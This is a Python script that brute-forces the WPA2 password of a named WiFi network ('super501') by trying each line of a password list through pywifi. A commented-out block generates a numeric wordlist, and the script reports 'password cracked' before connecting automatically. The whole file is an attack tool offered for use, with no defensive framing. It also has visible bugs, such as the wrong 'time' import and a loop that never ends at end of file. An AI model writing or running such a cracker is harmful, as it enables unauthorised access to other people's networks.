import itertools as its
from datetime import time

import pywifi
from pywifi import const

# words="1234567890"
# r=its.product(words,repeat=3)
# dic=open("./password.txt","a")
#
# for i in r:
#     dic.write("".join(i))
#     dic.write("".join("\n"))
#     #print(i)
# dic.close()
# print("密码本已生成")

def wifiConnect(pwd):
    wifi=pywifi.PyWiFi()
    ifaces=wifi.interfaces()[0]
    #print(ifaces)
    #print(ifaces.name())
    ifaces.disconnect()
    #time.sleep(1)
    wifistatus=ifaces.status()
    if wifistatus==const.IFACE_DISCONNECTED:

        profile=pywifi.Profile()
        profile.ssid="super501"
        profile.auth=const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher=const.CIPHER_TYPE_CCMP

        profile.key=pwd
        ifaces.remove_all_network_profiles()
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        #time.sleep(3)
        if ifaces.status()==const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已有wifi连接")

def readPassword():
    print("开始破解")
    path="./password.txt"
    file=open(path,"r")
    while True:
        try:
            pad=file.readline()
            print(pad)
            booL=wifiConnect(pad)

            if booL:
                print("密码已破解：",pad)
                print("wifi已自动连接！！！")
                break
            else:
                print("密码破解中...密码校对：",pad)
        except:
            continue
readPassword()

